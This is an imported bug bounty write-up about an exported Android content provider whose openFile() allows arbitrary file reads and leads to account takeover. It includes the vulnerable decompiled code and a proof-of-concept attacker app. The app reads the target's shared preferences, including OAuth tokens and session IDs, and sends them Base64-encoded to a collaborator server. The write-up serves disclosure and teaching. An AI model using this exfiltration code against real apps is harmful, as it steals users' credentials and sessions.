---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-04-20_unsecured-content-provider-leads-to-account-takeover.md
original_filename: 2024-04-20_unsecured-content-provider-leads-to-account-takeover.md
title: Unsecured Content Provider leads to Account Takeover
category: documents
detected_topics:
- oauth
- command-injection
- path-traversal
- otp
- graphql
- mobile-security
tags:
- imported
- documents
- oauth
- command-injection
- path-traversal
- otp
- graphql
- mobile-security
language: en
raw_sha256: 432d76cfe73cf5554e6b771fa3e7c462ee576829be0da449cb0d5a5165c3cce7
text_sha256: 3ecb873a2cb32d2bfeb6ebf84831f293ab0eb22fc2ab70b86fbf319e656fb88d
ingested_at: '2026-06-28T07:32:33Z'
sensitivity: unknown
redactions_applied: false
---

# Unsecured Content Provider leads to Account Takeover

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-04-20_unsecured-content-provider-leads-to-account-takeover.md
- Source Type: markdown
- Detected Topics: oauth, command-injection, path-traversal, otp, graphql, mobile-security
- Ingested At: 2026-06-28T07:32:33Z
- Redactions Applied: False
- Raw SHA256: `432d76cfe73cf5554e6b771fa3e7c462ee576829be0da449cb0d5a5165c3cce7`
- Text SHA256: `3ecb873a2cb32d2bfeb6ebf84831f293ab0eb22fc2ab70b86fbf319e656fb88d`


## Content

---
title: "Unsecured Content Provider leads to Account Takeover"
url: "https://medium.com/@ahmedelmorsy312/unsecure-content-provider-led-to-account-takeover-1e45d716bd7c"
authors: ["Ahmed Elmorsi (@0Xhunterx)"]
bugs: ["Android", "Account takeover", "Improper Export of Android Application Components"]
publication_date: "2024-04-20"
added_date: "2024-07-15"
source: "pentester.land/writeups.json"
original_index: 329
scraped_via: "browseros"
---

# Unsecured Content Provider leads to Account Takeover

Unsecured Content Provider leads to Account Takeover
Ahmed Elmorsi
Follow
3 min read
·
Apr 20, 2024

315

3

Press enter or click to view image in full size

Hello friend, Me and my friend oXnoOneXo were recently looking for an android application at Bugcrowd to hack on and luckily we found an android app that has an exported Content Provider in which the openFile() was insecurely implemented, So Hang on:

Just to clarify what’s a Content Provider, Here’s a quote from Google:

Content providers can help an application manage access to data stored by itself or stored by other apps and provide a way to share data with other apps. They encapsulate the data and provide mechanisms for defining data security. Content providers are the standard interface that connects data in one process with code running in another process.

Simply put, You can say it’s a way to share data between apps or within the same application between Activites or Services. Once we opened the app in JADX to get the Java source code we looked at the AndroidManifest.xml file which is XML file which contains important metadata about the Android app. We spotted a the following snippet:

<provider android:name="com.redacted.wamp.mediabrowser.v2.image.MediaBrowserImageContentProvider" android:exported="true" android:authorities="com.redacted.redacted.mediabrowser.v2.image.provider"/>

Seeing the provider is exported means that any application on the same device can interact with the content provider. The provider wasn’t implementing normal methods like query(), delete(), insert() or update() , The only method was used is openFile() which was doing simple checking on the passed URI in the following IF block:

if (app != null && (z12 = app.e().z1()) != null) {
  String path = uri.getPath();
  q.c(path);
  File file = new File(path);
  if (!file.exists()) {
  String name = file.getName();
  q.e(name, "getName(...)");
  Bitmap f10 = z12.f(name);
  try {
  file.createNewFile();
  if (f10 != null) {
  a(f10, file);
  } else {
  throw new IllegalArgumentException("Required value was null.".toString());
  }
  } catch (Exception e11) {
  if (e11.getMessage() == null) {
  e11.toString();
  }
  file.delete();
  throw new FileNotFoundException(uri.getPath());
  }
  }
  return ParcelFileDescriptor.open(file, 268435456);
}

The function was simply gets the path after (content://com.redacted.redacted.mediabrowser.v2.image.provider) which is defined as the value of authorities attribute, and initialize it as File object then check if the file doesn’t exists by:

Get Ahmed Elmorsi’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

String path = uri.getPath();
q.c(path);
File file = new File(path);
if (!file.exists()) { ... }

If the file does exist the function returns the file as ParcelFileDescriptor:

return ParcelFileDescriptor.open(file, 268435456);

So we don’t really need to dig into the code of IF statement that does some logic if the passed file doesn’t exist as long as we pass a valid path to certain file on the system. We found the file (com.redacted.tidal_preferences.xml) in the shared_prefs directory was having many sensitive data that was just encoded in Base64, The data were (oauth_access_token, oauth_refresh_token, session_session_id, user email, session_partner_id and more). Thereafter we built a simple application to get this file and send its content as Base64 to external server to simulate what an attacker can do, The code of the application was something like:

package com.hunting.test;
import android.net.Uri;
import android.os.Bundle;
import android.util.Base64;
import android.util.Log;
import androidx.appcompat.app.AppCompatActivity;
import java.io.IOException;
import java.io.InputStream;
/* loaded from: classes.dex */
public class MainActivity extends AppCompatActivity {
  /* JADX INFO: Access modifiers changed from: protected */
  @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
  public void onCreate(Bundle bundle) {
  super.onCreate(bundle);
  try {
  InputStream openInputStream = getContentResolver().openInputStream(Uri.parse("content://com.redacted.redacted.mediabrowser.v2.image.provider/data/data/com.redacted.redacted/shared_prefs/com.redacted.redacted_preferences.xml"));
  StringBuilder sb = new StringBuilder();
  while (true) {
  int read = openInputStream.read();
  if (read == -1) {
  break;
  }
  sb.append((char) read);
  }
  new HttpGetRequest().execute("https://collabServer/data=" + Base64.encodeToString(sb.toString().getBytes(), 0));
  if (openInputStream != null) {
  openInputStream.close();
  }
  } catch (IOException e) {
  Log.d("FAILED", e.toString());
  }
  }
}

Once the application was opened the content of the XML file was successfully sent to my collaborator link:

Press enter or click to view image in full size

So we finally did it:

Hope it was kinda useful to anyone. Peace.
